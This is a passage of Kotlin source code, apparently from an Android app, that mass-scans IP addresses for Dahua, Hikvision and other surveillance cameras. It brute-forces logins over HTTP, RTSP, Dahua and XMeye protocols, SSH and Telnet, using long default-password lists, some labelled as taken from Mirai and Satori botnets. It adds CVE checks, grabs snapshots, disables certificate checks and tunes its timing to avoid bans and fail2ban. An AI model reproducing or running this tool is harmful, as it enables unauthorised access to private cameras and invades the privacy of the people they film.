package com.dahua.checker

import android.util.Base64
import kotlinx.coroutines.*
import kotlinx.coroutines.sync.Semaphore
import kotlinx.coroutines.sync.withPermit
import kotlin.coroutines.cancellation.CancellationException
import java.io.ByteArrayOutputStream
import java.io.InputStream
import java.io.OutputStream
import java.net.HttpURLConnection
import java.net.InetSocketAddress
import java.net.Socket
import java.net.URL
import java.util.concurrent.atomic.AtomicInteger
import java.util.concurrent.atomic.AtomicLong
import net.schmizz.sshj.SSHClient
import net.schmizz.sshj.transport.verification.PromiscuousVerifier
import java.util.concurrent.TimeUnit
import javax.net.ssl.HttpsURLConnection
import javax.net.ssl.SSLContext
import javax.net.ssl.TrustManager
import javax.net.ssl.X509TrustManager
import javax.net.ssl.HostnameVerifier
import java.security.cert.X509Certificate

data class ScanResult(
    val ip: String,
    val port: Int,
    val login: String,
    val password: String,
    val model: String,
    val channels: Int,
    val snapshot: ByteArray?,
    val blocked: Boolean = false,
    val brand: String = "Dahua",
    val hasMic: Boolean = false,
    val timestampMs: Long = System.currentTimeMillis(),
    val metadata: Map<String, String> = emptyMap(),
    val openPortsList: List<Int> = emptyList()   // все открытые порты на этом IP
)

data class ScanProgress(
    val total: Int,
    val checked: Int,
    val successful: Int,
    val blocked: Int,
    val elapsedMs: Long,
    val finished: Boolean = false,
    val cancelled: Boolean = false,
    val etaMs: Long = 0L,
    val ipsPerSecond: Float = 0f,
    val openPorts: Int = 0,
    val lastLogLine: String = ""   // последняя строка лога для real-time отображения
)

class DahuaScanner {

    companion object {
        const val DEFAULT_PORT = 37777
        const val TIMEOUT_CONNECT = 2500    // Увеличен с 1500 — камеры иногда медленно отвечают
        const val TIMEOUT_READ = 5000      // Увеличен с 3000 — даём время на полный ответ
        const val TIMEOUT_SNAPSHOT = 4000  // Увеличен с 2500 — снапшоты тяжёлые
        const val TIMEOUT_HTTP = 5000      // Увеличен с 3000 — полноценная проверка HTTP
        const val TIMEOUT_PORT_SCAN = 1200 // Увеличен с 800 — не пропускаем медленные порты
        const val MAX_CONCURRENT = 80      // Уменьшен с 200 — качество важнее скорости
        const val SSH_MAX_CONCURRENT = 30  // Уменьшен с 50 — ещё осторожнее с fail2ban

        val CAMERA_PORTS = listOf(37777, 80, 81, 82, 83, 84, 85, 88, 443, 554, 2051, 3500, 7447, 8000, 8001, 8080, 8081, 8085, 8086, 8088, 8089, 8090, 8181, 8443, 8554, 8765, 8888, 8899, 9000, 9090, 10554, 34567, 22, 23, 2323, 5554, 8186, 49152, 55555)
        val HTTPS_PORTS = setOf(443, 8443)

        // Trust-all SSL для самоподписанных сертификатов камер
        private val trustAllCerts = arrayOf<TrustManager>(object : X509TrustManager {
            override fun checkClientTrusted(chain: Array<X509Certificate>?, authType: String?) {}
            override fun checkServerTrusted(chain: Array<X509Certificate>?, authType: String?) {}
            override fun getAcceptedIssuers(): Array<X509Certificate> = arrayOf()
        })
        private val trustAllHostname = HostnameVerifier { _, _ -> true }
        val sslContext: SSLContext = SSLContext.getInstance("TLS").apply {
            init(null, trustAllCerts, java.security.SecureRandom())
        }

        val SSH_CREDENTIALS = listOf(
            "root" to "root",
            "root" to "",
            "root" to "admin",
            "root" to "123456",
            "root" to "password",
            "root" to "1234",
            "root" to "12345",
            "root" to "toor",
            "root" to "pass",
            "root" to "vizxv",
            "root" to "xc3511",
            "root" to "xmhdipc",
            "root" to "juantech",
            "root" to "dreambox",
            "root" to "realtek",
            "root" to "default",
            "root" to "7ujMko0admin",
            "root" to "54321",
            "root" to "ikwb",
            "root" to "anko",
            "root" to "system",
            "root" to "camera",
            "root" to "ipc123",
            "admin" to "admin",
            "admin" to "123456",
            "admin" to "",
            "admin" to "password",
            "admin" to "1234",
            "admin" to "camera",
            "ubnt" to "ubnt",
            "service" to "service",
            "support" to "support",
            "user" to "user",
            "pi" to "raspberry",
            "pi" to "raspberryraspberry993311",
            // Mirai extended creds
            "root" to "888888",
            "root" to "666666",
            "root" to "1111",
            "root" to "klv123",
            "root" to "klv1234",
            "root" to "hi3518",
            "root" to "cat1029",
            "root" to "GM8182",
            "root" to "7ujMko0vizxv",
            "root" to "uClinux",
            "root" to "5up",
            "root" to "jvc",
            "root" to "jvbzd",
            "root" to "ivdev",
            "root" to "zlxx",
            "root" to "calvin",
            "root" to "fidel123",
            "root" to "Zte521",
            "root" to "HuiZhouDGT",
            "root" to "GiMiShare",
            "root" to "OxhlwSG8",
            "root" to "mobile",
            "root" to "tsgoingon",
            "root" to "r00tme",
            "root" to "root1234",
            "admin" to "smcadmin",
            "admin" to "epicrouter",
            "admin" to "ZmqVfoSIP",
            "admin" to "motorola",
            "admin" to "7ujMko0admin",
            "admin" to "1234",
            "admin" to "12345",
            "admin" to "54321",
            "admin" to "default",
            "admin" to "pass",
            "admin1" to "password",
            "administrator" to "1234",
            "Administrator" to "admin",
            "guest" to "guest",
            "guest" to "12345",
            "guest" to "",
            "666666" to "666666",
            "888888" to "888888",
            "osmc" to "osmc",
            "tech" to "tech",
            "default" to "OxhlwSG8",
            "default" to "tlJwpbo6",
            "default" to "S2fGqNFs",
            "default" to "tluafed",
            "supervisor" to "supervisor",
            "operator" to "operator",
            // Herospeed/Longsee
            "root" to "cxlinux",
            // cctvscan brand-specific SSH
            "root" to "axis",
            "root" to "axis123",
            "root" to "samsung",
            "root" to "samsung123",
            "root" to "vivotek",
            "root" to "vivotek123",
            "admin" to "samsung",
            "admin" to "panasonic"
        )

        val CREDENTIALS = listOf(
            "admin" to "admin",
            "admin" to "123456",
            "admin" to "",
            "admin" to "admin123",
            "admin" to "12345",
            "admin" to "1234",
            "admin" to "password",
            "admin" to "1111",
            "admin" to "111111",
            "admin" to "000000",
            "admin" to "1234567890",
            "admin" to "admin888",
            "admin" to "admin666",
            "666666" to "666666",
            "888888" to "888888",
            "default" to "tluafed",
            "user" to "user",
            "root" to "root",
            "root" to "admin",
            "root" to "123456",
            "root" to "",
            "guest" to "guest",
            "admin" to "7ujMko0admin",
            "admin" to "system",
            "admin" to "pass",
            "admin" to "camera",
            "admin" to "abc123",
            "admin" to "admin1",
            "admin" to "meinsm",
            "admin" to "fliradmin",
            "admin" to "123",
            "admin" to "4321",
            "admin" to "54321",
            "admin" to "888888",
            "admin" to "666666",
            "admin" to "qwerty",
            "admin" to "service",
            "admin" to "supervisor",
            "admin" to "support",
            "admin" to "tech",
            "admin" to "pass1234",
            "admin" to "macintosh",
            "admin" to "default",
            "admin" to "video",
            "admin" to "vizxv",
            "admin" to "hik12345",
            "admin" to "Hikvision",
            "admin" to "hikvision",
            "admin" to "HikHik",
            "admin" to "a]qwe1~!",
            "root" to "pass",
            "root" to "system",
            "root" to "password",
            "root" to "1234",
            "root" to "12345",
            "root" to "vizxv",
            "root" to "anko",
            "root" to "xc3511",
            "root" to "dreambox",
            "root" to "xmhdipc",
            "root" to "juantech",
            "root" to "54321",
            "root" to "ikwb",
            "root" to "realtek",
            "root" to "default",
            "root" to "7ujMko0admin",
            "service" to "service",
            "supervisor" to "supervisor",
            "ubnt" to "ubnt",
            "support" to "support",
            "operator" to "operator"
        ).distinct()

        // HTTP-пароли (больше — для полной проверки)
        val HTTP_CREDENTIALS = listOf(
            "admin" to "admin",
            "admin" to "123456",
            "admin" to "",
            "admin" to "12345",
            "admin" to "admin123",
            "admin" to "1234",
            "admin" to "password",
            "admin" to "1111",
            "admin" to "111111",
            "admin" to "000000",
            "admin" to "1234567890",
            "admin" to "888888",
            "admin" to "666666",
            "admin" to "admin888",
            "admin" to "admin666",
            "admin" to "qwerty",
            "admin" to "hik12345",
            "admin" to "Hikvision",
            "admin" to "hikvision",
            "admin" to "HikHik",
            "admin" to "camera",
            "admin" to "system",
            "admin" to "service",
            "admin" to "supervisor",
            "admin" to "video",
            "admin" to "vizxv",
            "admin" to "7ujMko0admin",
            "admin" to "meinsm",
            "admin" to "fliradmin",
            "admin" to "a]qwe1~!",
            "666666" to "666666",
            "888888" to "888888",
            "root" to "root",
            "root" to "",
            "root" to "admin",
            "root" to "123456",
            "root" to "pass",
            "root" to "vizxv",
            "root" to "xc3511",
            "root" to "xmhdipc",
            "root" to "juantech",
            "root" to "7ujMko0admin",
            "guest" to "guest",
            "default" to "tluafed",
            "service" to "service",
            "supervisor" to "supervisor",
            "ubnt" to "ubnt",
            "support" to "support",
            // Reolink defaults
            "admin" to "reolink",
            // Axis defaults
            "root" to "pass",
            // Vivotek defaults
            "root" to "vivotek",
            // Hanwha/Samsung defaults
            "admin" to "4321",
            // Bosch defaults
            "service" to "",
            "live" to "live",
            // ACTi defaults
            "admin" to "123456",
            "Admin" to "123456",
            // GeoVision defaults
            "admin" to "admin",
            // Grandstream defaults
            "admin" to "admin",
            // Amcrest defaults
            "admin" to "admin",
            // Pelco defaults
            "admin" to "pelco",
            "operator" to "pelco",
            // Milesight defaults
            "admin" to "ms1234",
            // Mobotix defaults
            "admin" to "meinsm",
            // AliOS / Chinese IoT defaults
            "admin" to "iot123",
            "admin" to "iot@2020",
            "admin" to "ali12345",
            "admin" to "smart",
            // Tuya defaults
            "admin" to "tuya",
            // TPLink/Tapo defaults
            "admin" to "tplink",
            // Tenda defaults
            "admin" to "tenda",
            // VStarcam defaults
            "admin" to "vstarcam2018",
            "admin" to "vstarcam",
            // Lorex defaults
            "admin" to "lorex",
            // Swann defaults
            "admin" to "swann",
            // Annke (Hikvision OEM) defaults
            "admin" to "annke2019",
            // Common IoT catchall
            "admin" to "ipc123",
            "admin" to "camera123",
            "admin" to "12345678",
            // cctvscan brand-specific
            "admin" to "dahua",
            "admin" to "dahua123",
            "admin" to "dahua1234",
            "admin" to "dahua12345",
            "root" to "axis",
            "root" to "axis123",
            "admin" to "axis",
            "admin" to "axis123",
            "admin" to "bosch",
            "admin" to "bosch123",
            "technician" to "technician",
            "admin" to "sony",
            "admin" to "sony123",
            "root" to "samsung",
            "root" to "samsung123",
            "admin" to "samsung",
            "admin" to "samsung123",
            "admin" to "panasonic",
            "admin" to "panasonic123",
            "root" to "vivotek",
            "root" to "vivotek123",
            "admin" to "vivotek123",
            "admin" to "cpplus",
            "admin" to "cpplus123",
            // Hikvision common passwords (cctvscan)
            "admin" to "Abc123",
            "admin" to "Changeme",
            "admin" to "Hello123",
            "admin" to "Passw0rd",
            "admin" to "Password1",
            "admin" to "Qwerty123",
            "admin" to "Welcome123",
            "admin" to "passw0rd",
            // Herospeed/Longsee
            "admin" to "12345678E",
            "admin" to "MI1YSANORQ4NAELR",
            "root" to "cxlinux",
            // Bosch extended
            "admin" to "bosch",
            // Sony
            "admin" to "sony",
            // Samsung/Hanwha
            "admin" to "samsung",
            // Panasonic
            "admin" to "panasonic",
            // CP Plus
            "admin" to "cpplus",
            // Intelbras
            "admin" to "intelbras",
            "admin" to "intelbras123",
            // RTSP scanner extras
            "admin" to "9999",
            "ftp" to "ftp",
            // Mirai HTTP
            "admin" to "smcadmin",
            "admin" to "epicrouter",
            "admin" to "ZmqVfoSIP",
            "admin" to "motorola",
            "admin1" to "password",
            "administrator" to "1234",
            "default" to "OxhlwSG8",
            "default" to "tlJwpbo6",
            "default" to "S2fGqNFs",
            "osmc" to "osmc",
            "tech" to "tech",
            // Ingram config.py additions
            "admin" to "admin12345",
            "admin" to "asdf1234",
            "admin" to "abc12345",
            "admin" to "12345admin",
            "admin" to "12345abc",

            // ── Hikvision post-2018 force-change defaults ─────────────────────
            // После прошивки 5.3.0+ Hikvision требует смены пароля при первом входе.
            // 90% установщиков вбивают один из этих вариантов — встречается массово.
            "admin" to "Admin1234",
            "admin" to "Admin12345",
            "admin" to "Admin123456",
            "admin" to "Admin@123",
            "admin" to "Admin@1234",
            "admin" to "admin@123",
            "admin" to "admin@1234",
            "admin" to "Hik12345",
            "admin" to "Hik@12345",
            "admin" to "hik@12345",
            "admin" to "hikadmin",
            "admin" to "Hikadmin1",
            "admin" to "Hikvision1",
            "admin" to "HikvisionAdmin",

            // ── Dahua / OEM DVR годовые дефолты ───────────────────────────────
            // Многие реселлеры ставят год+бренд как пароль
            "admin" to "admin2019",
            "admin" to "admin2020",
            "admin" to "admin2021",
            "admin" to "admin2022",
            "admin" to "admin2023",
            "admin" to "admin2024",
            "admin" to "dahua2019",
            "admin" to "dahua2020",
            "admin" to "dahua2021",
            "admin" to "dahua2022",
            "admin" to "Dahua2022",
            "admin" to "Dahua@123",
            "admin" to "dahua@123",

            // ── Китайские OEM DVR (порты 8080/8089) ───────────────────────────
            // Массовые дешёвые DVR с белым лейблом — Annke, ZOSI, Floureon, Sannce
            "admin" to "abc123",
            "admin" to "123abc",
            "admin" to "pass123",
            "admin" to "Pass123",
            "admin" to "1qaz2wsx",
            "admin" to "1Qaz2Wsx",
            "admin" to "qazwsx",
            "admin" to "abcd1234",
            "admin" to "a123456",
            "admin" to "A123456",
            "admin" to "admin0000",
            "admin" to "admin1111",
            "admin" to "admin5555",
            "admin" to "admin9999",
            "admin" to "ipc@12345",
            "admin" to "dvr12345",
            "admin" to "nvr12345",
            "admin" to "cctv1234",
            "admin" to "cctv12345",
            "admin" to "security",
            "admin" to "Security1",
            "admin" to "Security123",
            "admin" to "monitor",
            "admin" to "Monitor1",

            // ── Uniview дефолты ────────────────────────────────────────────────
            "admin" to "Admin123",
            "admin" to "Uniview1",
            "admin" to "uniview",

            // ── Reolink расширенные ────────────────────────────────────────────
            "admin" to "reolink123",
            "admin" to "Reolink1",

            // ── ONVIF / generic IP camera ──────────────────────────────────────
            "onvif" to "onvif",
            "onvif" to "admin",
            "onvif" to "123456",
            "onvif" to "",
            "user" to "user",
            "user" to "12345",
            "user" to "123456",
            "user" to "password",
            "operator" to "operator",
            "operator" to "123456",
            "viewer" to "viewer",
            "viewer" to "",

            // ── Hikvision расширенные слабые пароли (известны из утечек) ──────
            "admin" to "1234qwer",
            "admin" to "Qwer1234",
            "admin" to "Camera1",
            "admin" to "Camera123",
            "admin" to "Webcam1",
            "admin" to "Stream1",
            "admin" to "Video123",
            "admin" to "CCTV1234",

            // ── Исходники Mirai / Satori ботнетов — IoT дефолты ───────────────
            "admin" to "xc3511",
            "admin" to "jvbzd",
            "admin" to "aquario",
            "admin" to "zlxx.",
            "admin" to "dreambox",
            "admin" to "user",
            "pi" to "raspberry",
            "pi" to "pi",
            "PlcmSpIp" to "PlcmSpIp",
            "telecomadmin" to "admintelecom",
            "telecomadmin" to "telecomadmin",
            "enable" to "system",

            // ── Tiandy / TVT дефолты ───────────────────────────────────────────
            "admin" to "tiandy",
            "admin" to "Tiandy123",
            "admin" to "tvt",
            "admin" to "Tvt@12345",

            // ── Imou / Lechange (Dahua sub-brand) ─────────────────────────────
            "admin" to "imou",
            "admin" to "Imou1234",
            "admin" to "lechange"
        ).distinct()
    }

    @Volatile
    var cancelled = false

    // Лог-коллбэк — ScanService устанавливает его чтобы получать строки в реальном времени
    var onLogLine: ((String) -> Unit)? = null

    private fun log(msg: String) {
        val ts = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())
        onLogLine?.invoke("[$ts] $msg")
    }

    private val semaphore = Semaphore(MAX_CONCURRENT)
    private val checkedCount = AtomicInteger(0)
    private val successCount = AtomicInteger(0)
    private val blockedCount = AtomicInteger(0)
    private val openPortsCount = AtomicInteger(0)

    /**
     * Стандартное сканирование на конкретном порту (Dahua binary protocol)
     */
    private fun computeEta(checked: Int, total: Int, elapsedMs: Long): Pair<Long, Float> {
        if (checked <= 0 || elapsedMs <= 0) return 0L to 0f
        val ipsPerSec = checked.toFloat() / (elapsedMs / 1000f)
        val remaining = total - checked
        val etaMs = if (ipsPerSec > 0) (remaining / ipsPerSec * 1000).toLong() else 0L
        return etaMs to ipsPerSec
    }

    suspend fun scan(
        ips: List<String>,
        port: Int = DEFAULT_PORT,
        onResult: suspend (ScanResult) -> Unit,
        onProgress: suspend (ScanProgress) -> Unit
    ) {
        cancelled = false
        checkedCount.set(0)
        successCount.set(0)
        blockedCount.set(0)
        openPortsCount.set(0)
        // Рандомизация IP — меньше банов от одной подсети
        val shuffled = ips.shuffled()
        val total = shuffled.size
        val startTime = System.currentTimeMillis()

        try {
            coroutineScope {
                val progressJob = launch(Dispatchers.Default) {
                    while (isActive && !cancelled && checkedCount.get() < total) {
                        delay(200)
                        val elapsed = System.currentTimeMillis() - startTime
                        val (eta, speed) = computeEta(checkedCount.get(), total, elapsed)
                        onProgress(ScanProgress(total, checkedCount.get(), successCount.get(), blockedCount.get(), elapsed, etaMs = eta, ipsPerSecond = speed, openPorts = openPortsCount.get()))
                    }
                }

                shuffled.map { ip ->
                    async(Dispatchers.IO) {
                        ensureActive()
                        if (cancelled) {
                            checkedCount.incrementAndGet()
                            return@async
                        }
                        semaphore.withPermit {
                            ensureActive()
                            if (cancelled) {
                                checkedCount.incrementAndGet()
                                return@withPermit
                            }
                            try {
                                val result = tryCredentials(ip, port)
                                if (result != null) {
                                    if (result.blocked) blockedCount.incrementAndGet()
                                    else successCount.incrementAndGet()
                                    onResult(result)
                                }
                            } catch (ce: CancellationException) {
                                throw ce
                            } catch (_: Exception) {}
                            checkedCount.incrementAndGet()
                        }
                    }
                }.awaitAll()

                progressJob.cancel()
            }
        } catch (_: CancellationException) {
            cancelled = true
        }
        val elapsed = System.currentTimeMillis() - startTime
        val (eta, speed) = computeEta(checkedCount.get(), total, elapsed)
        withContext(NonCancellable) {
            onProgress(ScanProgress(total, checkedCount.get(), successCount.get(), blockedCount.get(), elapsed,
                finished = !cancelled, cancelled = cancelled, etaMs = eta, ipsPerSecond = speed, openPorts = openPortsCount.get()))
        }
    }

    /**
     * Мультипортовое сканирование — проверяет все порты камер.
     * Сначала Dahua binary (37777), потом HTTP (80, 8080, 8000, 8899), потом RTSP (554), XMeye (34567).
     */
    suspend fun scanMultiPort(
        ips: List<String>,
        onResult: suspend (ScanResult) -> Unit,
        onProgress: suspend (ScanProgress) -> Unit
    ) {
        cancelled = false
        checkedCount.set(0)
        successCount.set(0)
        blockedCount.set(0)
        openPortsCount.set(0)
        val shuffled = ips.shuffled()
        val total = shuffled.size
        val startTime = System.currentTimeMillis()

        try {
            coroutineScope {
                val progressJob = launch(Dispatchers.Default) {
                    while (isActive && !cancelled && checkedCount.get() < total) {
                        delay(200)
                        val elapsed = System.currentTimeMillis() - startTime
                        val (eta, speed) = computeEta(checkedCount.get(), total, elapsed)
                        onProgress(ScanProgress(total, checkedCount.get(), successCount.get(), blockedCount.get(), elapsed, etaMs = eta, ipsPerSecond = speed, openPorts = openPortsCount.get()))
                    }
                }

                shuffled.map { ip ->
                    async(Dispatchers.IO) {
                        ensureActive()
                        if (cancelled) {
                            checkedCount.incrementAndGet()
                            return@async
                        }
                        semaphore.withPermit {
                            ensureActive()
                            if (cancelled) {
                                checkedCount.incrementAndGet()
                                return@withPermit
                            }
                            try {
                                val result = scanAllPorts(ip)
                                if (result != null) {
                                    if (result.blocked) blockedCount.incrementAndGet()
                                    else successCount.incrementAndGet()
                                    onResult(result)
                                }
                            } catch (ce: CancellationException) {
                                throw ce
                            } catch (_: Exception) {}
                            checkedCount.incrementAndGet()
                        }
                    }
                }.awaitAll()

                progressJob.cancel()
            }
        } catch (_: CancellationException) {
            cancelled = true
        }
        val elapsed = System.currentTimeMillis() - startTime
        val (eta, speed) = computeEta(checkedCount.get(), total, elapsed)
        withContext(NonCancellable) {
            onProgress(ScanProgress(total, checkedCount.get(), successCount.get(), blockedCount.get(), elapsed,
                finished = !cancelled, cancelled = cancelled, etaMs = eta, ipsPerSecond = speed, openPorts = openPortsCount.get()))
        }
    }

    private fun scanAllPorts(ip: String): ScanResult? {
        return scanSelectedPortsInternal(ip, CAMERA_PORTS)
    }

    /**
     * Nmap-style быстрая проверка открытых портов.
     * TCP connect на все порты параллельно с коротким таймаутом.
     * Возвращает только открытые порты — экономит время на закрытых.
     */
    private fun quickPortScan(ip: String, ports: List<Int>): Set<Int> {
        val open = java.util.concurrent.ConcurrentHashMap.newKeySet<Int>()
        val executor = java.util.concurrent.Executors.newFixedThreadPool(
            minOf(ports.size, 32)
        )
        val latch = java.util.concurrent.CountDownLatch(ports.size)

        for (port in ports) {
            executor.submit {
                try {
                    Socket().use { s ->
                        s.connect(InetSocketAddress(ip, port), TIMEOUT_PORT_SCAN)
                        open.add(port)
                        openPortsCount.incrementAndGet()
                    }
                } catch (_: Exception) {
                    // порт закрыт или filtered
                } finally {
                    latch.countDown()
                }
            }
        }

        try {
            latch.await(TIMEOUT_PORT_SCAN.toLong() + 500, TimeUnit.MILLISECONDS)
        } catch (_: Exception) {}
        executor.shutdownNow()
        return open
    }

    private fun scanSelectedPortsInternal(ip: String, ports: List<Int>): ScanResult? {
        try {
            if (cancelled) return null

            // ═══ ФАЗА 1: Nmap-style быстрый порт-скан ═══
            // Параллельный TCP connect на все порты → знаем какие открыты
            val openPorts = quickPortScan(ip, ports)
            if (openPorts.isEmpty() || cancelled) return null

            val openSorted = openPorts.sorted()
            log("$ip → открыты порты: ${openSorted.joinToString(", ")}")

            // ═══ ФАЗА 2: Проверка протоколов только на открытых портах ═══

            // 1. Dahua binary protocol (37777)
            if (37777 in openPorts && !cancelled) {
                log("$ip:37777 → проверяю Dahua binary")
                val dahua = tryCredentials(ip, 37777)
                if (dahua != null) {
                    log("$ip:37777 → ✓ Dahua [${dahua.login}:${dahua.password}]")
                    // #19: RTSP-верификация
                    val rtspMeta = if (verifyRtspAlive(ip)) mapOf("rtspAlive" to "true") else emptyMap()
                    return dahua.copy(openPortsList = openSorted, metadata = dahua.metadata + rtspMeta)
                }
            }

            // 2. HTTP-порты — Hikvision/Dahua/Generic web UI (включая HTTPS)
            val httpPorts = listOf(80, 8080, 8000, 8089, 8899, 8081, 8088, 9000, 8888, 443, 8443, 81, 85, 88, 3500, 7447, 8765, 9090).filter { it in openPorts }
            for (port in httpPorts) {
                if (cancelled) return null
                log("$ip:$port → проверяю HTTP")
                val http = tryHttpCamera(ip, port)
                if (http != null) {
                    log("$ip:$port → ✓ ${http.brand} HTTP [${http.login}:${http.password}]")
                    // #19: RTSP-верификация — проверяем есть ли живой RTSP на 554
                    val rtspMeta = if (verifyRtspAlive(ip)) mapOf("rtspAlive" to "true") else emptyMap()
                    return http.copy(openPortsList = openSorted, metadata = http.metadata + rtspMeta)
                }
                // #16 Авто-ретрай: порт открыт (был в openPorts) но HTTP-брут не дал результата —
                // ждём 300ms и пробуем ещё раз с другими кредами если это не последний порт
                if (!cancelled) {
                    Thread.sleep(300)
                    log("$ip:$port → HTTP ретрай #2")
                    val http2 = tryHttpCamera(ip, port)
                    if (http2 != null) {
                        log("$ip:$port → ✓ ${http2.brand} HTTP retry [${http2.login}:${http2.password}]")
                        val rtspMeta = if (verifyRtspAlive(ip)) mapOf("rtspAlive" to "true") else emptyMap()
                        return http2.copy(openPortsList = openSorted, metadata = http2.metadata + rtspMeta)
                    }
                }
            }

            // 3. RTSP — стандартные RTSP порты + те что HTTP не опознал
            // Камеры часто гонят RTSP на 8000/8080/8554/8090 вместе с HTTP
            val rtspPorts = listOf(
                554, 5554, 8554, 10554,   // классика
                8000, 8080, 8090, 8081,   // Hikvision/Dahua RTSP на HTTP-портах
                8088, 8086, 49152         // другие камеры
            ).filter { it in openPorts }
            for (rtspPort in rtspPorts) {
                if (cancelled) return null
                log("$ip:$rtspPort → проверяю RTSP")
                val rtsp = tryRtspAuth(ip, rtspPort)
                if (rtsp != null) {
                    log("$ip:$rtspPort → ✓ RTSP ${rtsp.brand} [${rtsp.login}:${rtsp.password}] ${rtsp.model}")
                    // #19: порт 554 уже подтверждён как RTSP — помечаем rtspAlive
                    val rtspMeta = if (rtspPort == 554 || verifyRtspAlive(ip)) mapOf("rtspAlive" to "true") else emptyMap()
                    return rtsp.copy(openPortsList = openSorted, metadata = rtsp.metadata + rtspMeta)
                }
            }

            // 4. XMeye binary protocol (34567)
            if (34567 in openPorts && !cancelled) {
                log("$ip:34567 → проверяю XMeye binary")
                val xmeye = tryXMeye(ip)
                if (xmeye != null) {
                    log("$ip:34567 → ✓ XMeye [${xmeye.login}:${xmeye.password}]")
                    val rtspMeta = if (verifyRtspAlive(ip)) mapOf("rtspAlive" to "true") else emptyMap()
                    return xmeye.copy(openPortsList = openSorted, metadata = xmeye.metadata + rtspMeta)
                }
            }

            // 5. SSH (22)
            if (22 in openPorts && !cancelled) {
                log("$ip:22 → проверяю SSH")
                val ssh = trySsh(ip)
                if (ssh != null) {
                    log("$ip:22 → ✓ SSH [${ssh.login}:${ssh.password}]")
                    return ssh.copy(openPortsList = openSorted)
                }
            }

            // 6. Telnet (23, 2323)
            val telnetPorts = listOf(23, 2323).filter { it in openPorts }
            for (tp in telnetPorts) {
                if (cancelled) return null
                log("$ip:$tp → проверяю Telnet")
                val telnet = tryTelnet(ip, tp)
                if (telnet != null) {
                    log("$ip:$tp → ✓ Telnet [${telnet.login}:${telnet.password}]")
                    return telnet.copy(openPortsList = openSorted)
                }
            }

            // 7. ── Ingram CVE phase ── (run on ALL open non-Dahua ports)
            // CVE/fingerprint checks are unauthenticated — run even if HTTP auth failed.
            // Порты 37777 (Dahua binary) и 34567 (XMeye binary) уже обработаны выше.
            // Порт 8899 (Xiongmai ONVIF) включён в runCvePhase внутри — не дублируем.
            if (!cancelled) {
                // Приоритет: сначала стандартные HTTP, потом остальные
                // HTTP/HTTPS порты в порядке приоритета (без SSH/Telnet/Dahua-binary)
                val ingramPortOrder = listOf(
                    80, 8080, 8000, 8089, 8081, 8088, 9000, 443, 8443,
                    81, 82, 83, 84, 85, 88, 2051, 8001, 8085, 8086, 8090,
                    8181, 8186, 3500, 7447, 8765, 8888, 8899, 9090,
                    49152, 55555
                )
                // Собираем все открытые порты кроме:
                //   37777/34567 — Dahua/XMeye binary (уже обработаны)
                //   22/23/2323  — SSH/Telnet (не HTTP, обработаны отдельно)
                val ingramPorts = ingramPortOrder.filter { p ->
                    p in openPorts && p !in setOf(37777, 34567, 22, 23, 2323)
                }
                for (ingramPort in ingramPorts) {
                    if (cancelled) return null
                    log("$ip:$ingramPort → CVE проверка (Ingram)")
                    val cve = IngramCveChecker.runCvePhase(ip, ingramPort)
                    if (cve != null) {
                        log("$ip:$ingramPort → ✓ CVE найден! [${cve.login}:${cve.password}]")
                        val rtspMeta = if (verifyRtspAlive(ip)) mapOf("rtspAlive" to "true") else emptyMap()
                        return cve.copy(openPortsList = openSorted, metadata = cve.metadata + rtspMeta)
                    }
                }
            }
            log("$ip → нет результата (порты: ${openSorted.joinToString(",")})")
        } catch (_: Exception) {}

        return null
    }

    /**
     * Сканирование с выбранными портами
     */
    suspend fun scanSelectedPorts(
        ips: List<String>,
        selectedPorts: List<Int>,
        onResult: suspend (ScanResult) -> Unit,
        onProgress: suspend (ScanProgress) -> Unit
    ) {
        cancelled = false
        checkedCount.set(0)
        successCount.set(0)
        blockedCount.set(0)
        openPortsCount.set(0)
        val shuffled = ips.shuffled()
        val total = shuffled.size
        val startTime = System.currentTimeMillis()

        try {
            coroutineScope {
                val progressJob = launch(Dispatchers.Default) {
                    while (isActive && !cancelled && checkedCount.get() < total) {
                        delay(200)
                        val elapsed = System.currentTimeMillis() - startTime
                        val (eta, speed) = computeEta(checkedCount.get(), total, elapsed)
                        onProgress(ScanProgress(total, checkedCount.get(), successCount.get(), blockedCount.get(), elapsed, etaMs = eta, ipsPerSecond = speed, openPorts = openPortsCount.get()))
                    }
                }

                shuffled.map { ip ->
                    async(Dispatchers.IO) {
                        ensureActive()
                        if (cancelled) {
                            checkedCount.incrementAndGet()
                            return@async
                        }
                        semaphore.withPermit {
                            ensureActive()
                            if (cancelled) {
                                checkedCount.incrementAndGet()
                                return@withPermit
                            }
                            try {
                                val result = scanSelectedPortsInternal(ip, selectedPorts)
                                if (result != null) {
                                    if (result.blocked) blockedCount.incrementAndGet()
                                    else successCount.incrementAndGet()
                                    onResult(result)
                                }
                            } catch (ce: CancellationException) {
                                throw ce
                            } catch (_: Exception) {}
                            checkedCount.incrementAndGet()
                        }
                    }
                }.awaitAll()

                progressJob.cancel()
            }
        } catch (_: CancellationException) {
            cancelled = true
        }
        val elapsed = System.currentTimeMillis() - startTime
        val (eta, speed) = computeEta(checkedCount.get(), total, elapsed)
        withContext(NonCancellable) {
            onProgress(ScanProgress(total, checkedCount.get(), successCount.get(), blockedCount.get(), elapsed,
                finished = !cancelled, cancelled = cancelled, etaMs = eta, ipsPerSecond = speed, openPorts = openPortsCount.get()))
        }
    }

    // ─── HTTP Camera Check (Hikvision/Dahua/Generic) ───

    private fun tryHttpCamera(ip: String, port: Int): ScanResult? {
        // ── Специализированные fast-path для портов 8000 / 8080 / 8089 ──────────
        // Эти порты имеют особое поведение: на 8000 могут отвечать одновременно
        // Hikvision ISAPI, Dahua binary и generic HTTP; на 8080/8089 — OEM DVR панели.
        // Запускаем быструю Ingram-проверку ДО detectBrand (которая медленная на 8000
        // из-за binary-протокола на /).
        when (port) {
            8000 -> {
                // Hikvision ISAPI direct — отвечает на /ISAPI/System/deviceInfo
                // даже если / возвращает бинарный ответ (Dahua SDK)
                IngramCveChecker.tryHikvisionISAPI8000Pub(ip)?.let { return it }
            }
            8080, 8089 -> {
                // Dahua RPC2 на нестандартных портах — быстрее чем detectBrand loop
                IngramCveChecker.tryDahuaRPC2LoginPub(ip, port)?.let { return it }
            }
        }

        // Порт уже проверен в quickPortScan — сразу определяем бренд
        val brand = detectBrand(ip, port)
        if (brand == "Unknown") return null

        // Для Dahua на порту 8000 — пробуем binary протокол тоже
        if (brand == "Dahua" && port == 8000) {
            val dahua = tryCredentials(ip, port)
            if (dahua != null) return dahua
        }

        for ((login, password) in HTTP_CREDENTIALS) {
            if (cancelled) return null
            try {
                val authResult = when (brand) {
                    "Hikvision" -> tryHikvisionAuth(ip, port, login, password)
